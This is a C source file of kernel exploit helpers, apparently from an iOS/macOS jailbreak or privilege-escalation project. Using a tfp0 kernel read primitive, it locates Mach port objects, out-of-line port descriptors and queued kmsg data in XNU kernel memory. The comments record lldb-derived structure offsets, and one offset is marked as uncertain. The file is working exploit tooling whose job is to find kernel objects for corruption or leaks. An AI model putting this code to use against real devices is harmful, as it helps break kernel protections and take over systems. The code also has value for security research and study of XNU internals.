#include "find_port.h"
#include "offsets.h"
#include "tfp0_krw.h"
#include "proc.h"

uint64_t find_port(mach_port_name_t port) {
    uint64_t task_addr = task_self_addr();
    
    uint64_t itk_space = tfp0_kread64(task_addr + off_task_itk_space);
    
    uint64_t is_table = tfp0_kread64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = tfp0_kread64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_oolports_from_port(mach_port_name_t port) {
    uint64_t port_kaddr = find_port(port);

    uint32_t off_ipc_port_ikmq_base = 0x40;
    uint64_t ikmq_base = tfp0_kread64(port_kaddr + off_ipc_port_ikmq_base);
    // printf("ikmq_base: 0x%llx\n", ikmq_base);

    // tfp0_khexdump(ikmq_base, 0x100);
    // while(1) {};

    uint32_t off_ipc_kmsg_ikm_header = 0x20; // p/x offsetof(ipc_kmsg, ikm_header)
    uint64_t ikm_header = tfp0_kread64(ikmq_base+off_ipc_kmsg_ikm_header);

    uint64_t off_mach_msg_ool_ports_desc_address = 0x24; //?
    return tfp0_kread64(ikm_header + off_mach_msg_ool_ports_desc_address);
}

uint32_t cnt = 0;
uint64_t find_kmsgdata_from_port(mach_port_name_t port) {

    // struct ipc_port {
    // ...
    //      struct ipc_mqueue               ip_messages;
    // ...
    // }
    // 
    // typedef struct ipc_mqueue {
    //      circle_queue_head_t     imq_messages;
    // ...
    // }
    //
    // Trace Hint; BigSur11.2.3_t8020/kernel.release.t8020.i64
    // xnu-7195.81.3/osfmk/ipc/ipc_mqueue.c:1187 ipc_mqueue_peek_locked
    // ikmq_base = kmsg
    // 
    // ipc_mqueue_t            mq
    // kmsgq = &mq->imq_messages;
    // kmsg = ipc_kmsg_queue_first(kmsgq);
    
    // #define ipc_kmsg_queue_first(queue) \
	// cqe_queue_first(queue, struct ipc_kmsg, ikm_link)

    // #define cqe_queue_first(head, type, field) ({ \
    // 	queue_entry_t _tmp_entry = circle_queue_first((head)); \
    // 	type *_tmp_element = (type*) NULL; \
    // 	if (_tmp_entry != (queue_entry_t) NULL) \
    // 	        _tmp_element = cqe_element(_tmp_entry, type, field); \
    // 	_tmp_element; \
    // })

    // static inline queue_entry_t
    // circle_queue_first(circle_queue_t cq)
    // {
    // 	return cq->head;
    // }

    // #define cqe_element(qe, type, field) __container_of(qe, type, field)

    // #define __container_of(ptr, type_t, field) __extension__({ \
    // 	const __typeof__(((type_t *)NULL)->field) *__ptr = (ptr);               \
    // 	uintptr_t __result = (uintptr_t)__ptr - offsetof(type_t, field);        \
    // 	if (__ptr) __builtin_assume(__result != 0);                             \
    // 	__unsafe_forge_single(type_t *, __result);                              \
    // })

    
    // typedef circle_queue_t                  ipc_kmsg_queue_t;

    // typedef struct circle_queue_head {
    // 	queue_entry_t head;
    // } circle_queue_head_t, *circle_queue_t;

    // typedef struct queue_entry      *queue_entry_t;

    // struct queue_entry {
    // 	struct queue_entry      *next;          /* next element */
    // 	struct queue_entry      *prev;          /* previous element */
    // };

    uint64_t port_kaddr = find_port(port);

    // 0x18 = p/x offsetof(ipc_port, ip_messages)

    // 0x28 = ipc_mqueue's messages offset
    // messages's type is ipc_mqueue
    /*
    (lldb) type lookup ipc_mqueue
    struct ipc_mqueue {
        union  {
            struct  {
                waitq waitq;
                ipc_kmsg_queue messages;
    ...
    (lldb) p/x (size_t)sizeof(struct waitq)
    (size_t) 0x0000000000000028

    (lldb) type lookup ipc_kmsg_queue
    struct ipc_kmsg_queue {
        ipc_kmsg *ikmq_base;
    }
    */

    uint32_t off_ipc_port_ikmq_base = 0x18+0x28;
    uint64_t ikmq_base = tfp0_kread64(port_kaddr + off_ipc_port_ikmq_base);
    // INFO("ikmq_base: 0x%llx\n", ikmq_base);

    /*
    (lldb) type lookup ipc_kmsg
    struct ipc_kmsg {
        mach_msg_size_t ikm_size;
        uint32_t ikm_ppriority;
        ipc_kmsg *ikm_next;
        ipc_kmsg *ikm_prev;
        union  {
            __ptrauth(2,1,62751) ipc_port_t ikmu_prealloc;
            void *__ptrauth(2,1,40392) ikmu_data;
        };
        ipc_kmsg::(unnamed union) ikm_u;
        mach_msg_header_t *__ptrauth(2,1,15525) ikm_header;
        __ptrauth(2,1,39424) ipc_port_t ikm_voucher;
        ipc_importance_elem *ikm_importance;
        queue_chain_t ikm_inheritance;
        turnstile *ikm_turnstile;
        uintptr_t ikm_signature;
        ipc_kmsg_flags_t ikm_flags;
        mach_msg_qos_t ikm_qos_override;
        mach_msg_filter_id ikm_filter_policy_id;
    }
    */

    /*
    (lldb) p/x offsetof(ipc_kmsg, ikm_u)
    (unsigned long) 0x0000000000000018
    */

    return tfp0_kread64(ikmq_base+0x18);
}